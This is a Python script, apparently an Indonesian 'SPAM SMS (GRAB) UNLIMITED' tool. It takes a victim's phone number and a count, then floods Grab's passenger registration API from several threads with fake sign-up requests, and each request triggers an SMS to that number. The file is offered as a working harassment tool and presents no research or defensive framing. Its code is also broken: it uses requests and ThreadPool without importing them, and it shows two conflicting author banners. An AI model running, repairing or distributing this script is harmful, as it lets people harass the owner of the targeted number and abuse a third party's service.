# coding:utf8

import os, sys, time, random, urllib2

logo = """
\033[37;1m╭━━━━━━━╮
┃  \033[32;1m● ══ \033[37;1m┃
┃\033[0;37m███████\033[37;1m┃        \033[37;1m─╤╦︻=(\033[31;1m◣\033[37;1m_\033[31;1m◢\033[37;1m)=︻╦╤─
┃\033[0;37m███████\033[37;1m┃
┃\033[0;37m███████\033[37;1m┃  \033[35;1m==[\033[34;1m SPAM SMS  ALL OPERATOR \033[35;1m]==
\033[37;1m┃\033[0;37m███████\033[37;1m┃  \033[35;1m+-----------------------------+\033[35;1m
\033[37;1m┃\033[0;37m███████\033[37;1m┃ \033[35;1m |\033[37;1m Author\033[31;1m :\033[36;1m Wisnu Saputra          \033[35;1m|
\033[37;1m┃   \033[33;1m○  \033[37;1m ┃ \033[35;1m |\033[37;1m Instagram\033[31;1m :\033[32;1m wisnu_as123 \033[35;1m|
\033[37;1m╰━━━━━━━╯ \033[35;1m +-----------------------------+
\033[31;1m+==========================================+"""

def tik():
    animation = '|/-\\'
    for i in range(100):
        time.sleep(0.1)
        sys.stdout.write('\r\033[32;1m[=]\033[37;1m Sedang Mengirim \033[31;1m' + animation[(i % len(animation))])
        sys.stdout.flush()

try:
	os.system('clear')
	print("""\033[1;32m
   _  _     \033[1;36mSPAM SMS (GRAB) UNLIMITED\033[1;32m
 _| || |_   \033[1;31mAuthor : Mr.4LD1\033[1;32m
|_  ..  _|  \033[1;31mContact : 082231589330\033[1;32m
|_      _|  \033[1;31mgithub : https://github.com/Mr4LD1\033[1;32m
  |_||_| 
""")
	no = input("\033[1;37m[?] NOMOR (Pakai 62 Gan) =>\033[1;36m ")
	jum=int(input("\033[1;37m[?] Jumlah => \033[1;36m"))
except KeyboardInterrupt:
	print("\nKey interrupt")
	exit()
print()
print("[*] RESULT:")
def main(arg):
	try:
		idk=('phoneNumber')
		r = requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber':no, 'countryCode': 'ID', 'name': 'nuubi', 'email': 'nuubi@mail.com', 'deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
#		print(r.text)
		if str(idk) in str(r.text):
			print("\033[1;32m[+] SUKSES")
		else:
			print("\033[1;31m[-] GAGAL")
	except: pass

jobs = []
for x in range(jum):
    jobs.append(x)
p=ThreadPool(5)
p.map(main,jobs)
print("done ^•^")
